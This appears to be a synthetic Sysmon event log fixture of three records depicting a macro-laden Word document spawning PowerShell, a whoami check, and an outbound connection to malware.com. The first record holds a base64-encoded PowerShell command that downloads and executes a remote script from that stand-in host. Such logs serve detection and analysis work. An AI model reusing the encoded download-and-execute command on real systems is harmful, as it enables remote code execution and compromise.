[
  {
    "EventID": 1,
    "UtcTime": "2024-01-15T14:30:00.000",
    "ProcessGuid": "{12345678-1234-1234-1234-123456789012}",
    "ProcessId": 5432,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "FileVersion": "10.0.19041.1",
    "Description": "Windows PowerShell",
    "Product": "Microsoft Windows Operating System",
    "Company": "Microsoft Corporation",
    "OriginalFileName": "PowerShell.EXE",
    "CommandLine": "powershell.exe -encodedcommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlAC4AYwBvAG0ALwBzAGMAcgBpAHAAdAAuAHAAcwAxACcAKQApAA==",
    "CurrentDirectory": "C:\\Users\\victim\\",
    "User": "DESKTOP-ABC123\\victim",
    "LogonGuid": "{12345678-5678-5678-5678-567890123456}",
    "LogonId": "0x12345",
    "TerminalSessionId": 1,
    "IntegrityLevel": "Medium",
    "Hashes": "SHA256=ABC123...",
    "ParentProcessGuid": "{12345678-9012-9012-9012-901234567890}",
    "ParentProcessId": 1234,
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\victim\\Downloads\\invoice.docm\"",
    "Computer": "DESKTOP-ABC123"
  },
  {
    "EventID": 1,
    "UtcTime": "2024-01-15T14:32:00.000",
    "ProcessGuid": "{12345678-2345-2345-2345-234567890123}",
    "ProcessId": 6789,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "FileVersion": "10.0.19041.1",
    "Description": "Windows Command Processor",
    "Product": "Microsoft Windows Operating System",
    "Company": "Microsoft Corporation",
    "OriginalFileName": "Cmd.Exe",
    "CommandLine": "cmd.exe /c whoami",
    "CurrentDirectory": "C:\\Users\\admin\\",
    "User": "DESKTOP-ABC123\\admin",
    "LogonGuid": "{12345678-6789-6789-6789-678901234567}",
    "LogonId": "0x67890",
    "TerminalSessionId": 1,
    "IntegrityLevel": "High",
    "Hashes": "SHA256=DEF456...",
    "ParentProcessGuid": "{12345678-0123-0123-0123-012345678901}",
    "ParentProcessId": 4567,
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "Computer": "DESKTOP-ABC123"
  },
  {
    "EventID": 3,
    "UtcTime": "2024-01-15T14:35:00.000",
    "ProcessGuid": "{12345678-1234-1234-1234-123456789012}",
    "ProcessId": 5432,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "User": "DESKTOP-ABC123\\victim",
    "Protocol": "tcp",
    "Initiated": true,
    "SourceIsIpv6": false,
    "SourceIp": "10.0.1.50",
    "SourceHostname": "DESKTOP-ABC123",
    "SourcePort": 54321,
    "DestinationIsIpv6": false,
    "DestinationIp": "203.0.113.100",
    "DestinationHostname": "malware.com",
    "DestinationPort": 443,
    "Computer": "DESKTOP-ABC123"
  }
]
